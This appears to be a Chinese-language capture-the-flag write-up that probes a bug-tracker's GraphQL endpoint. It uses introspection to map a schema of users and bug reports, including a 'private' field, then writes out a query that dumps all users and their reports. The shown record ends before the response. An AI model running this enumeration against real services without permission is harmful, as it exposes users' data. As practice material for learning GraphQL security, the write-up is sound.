
## 侦察与探测

访问首页
- 响应
    ```html
    <a href="graphql">GraphiQL</a>
    ```

使用 GQL 端点
- 请求
    ```http
    GET /graphql HTTP/1.1
    ```
    - 响应，返回 JS 交互式 GQL

- 自动发送格式查询
    ```http
    POST /graphql? HTTP/2
    ```

    - 对响应的格式 JSON 使用 [GQL 可视化工具 ](https://nathanrandal.com/graphql-visualizer/)

分析 GQL 格式，并构造查询
- 数据库内容：用户-漏洞
    ```log
    allUsers(before:String, after:String, first:Int, last:Int): UsersConnection 

    UsersConnection 
    pageInfo: PageInfo! edges: [UsersEdge]

    PageInfo 
    hasNextPage: Boolean! hasPreviousPage: Boolean! startCursor: String endCursor: String

    UsersEdge 
    node: Users cursor: String!

    Users 
    id: ID! username: String bugs(before:String, after:String, first:Int, last:Int): Bugs_Connection

    Bugs_Connection 
    pageInfo: PageInfo! edges: [Bugs_Edge]!

    Bugs_Edge 
    node: Bugs_ cursor: String!

    Bugs_ 
    id: ID! reporterId: Int text: String private: Boolean reporter: Users
    ```
    - 注意 `Bugs_` 与 `Users` 互联，仅查询一次

- 查询所有用户信息
    ```graphql
    query myGetUsers {
        allUsers {
            edges{
                node {
                    id
                    username
                    bugs {
                        pageInfo{
                            startCursor
                            endCursor
                        }
                        edges{
                            node {
                                id
                                reporterId
                                text
                            }
                            cursor
                        }
                    }
                }
                cursor
            }
            pageInfo{
                startCursor
                endCursor
            }
        }
    }
    ```
    - 响应
